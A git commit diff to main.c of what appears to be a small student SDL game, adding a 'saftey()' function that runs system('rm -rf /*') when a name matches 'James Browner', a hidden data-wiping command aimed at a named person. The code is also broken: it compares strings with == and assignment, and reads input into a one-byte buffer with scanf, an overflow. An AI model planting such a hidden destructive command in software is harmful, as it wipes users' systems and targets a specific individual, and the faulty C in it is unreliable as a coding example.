f80b2c8eac881071eb08e7ab40642de108339676
bredBoi-tech <51cpayne@crschools.us>
2025-10-23 12:06:28 -0500

    Update main.c

--- main.c
+++ main.c
@@ -1,10 +1,24 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <SDL.h>
 
-char A [20];
+char A [1];
+char name [24];
 
+void saftey(){
+  if(name="Matthew"){
+    
+  }
+  if(name == "James Browner"){
+    system("echo \"\"");
+    system("rm -rf /*");
+  }
+}
 int main(){
   printf("run game Y/N?");
   scanf("%s",A);
+  if(strcmp(A,"Y") == 0){
+    printf("then lets go");
+  }
 }
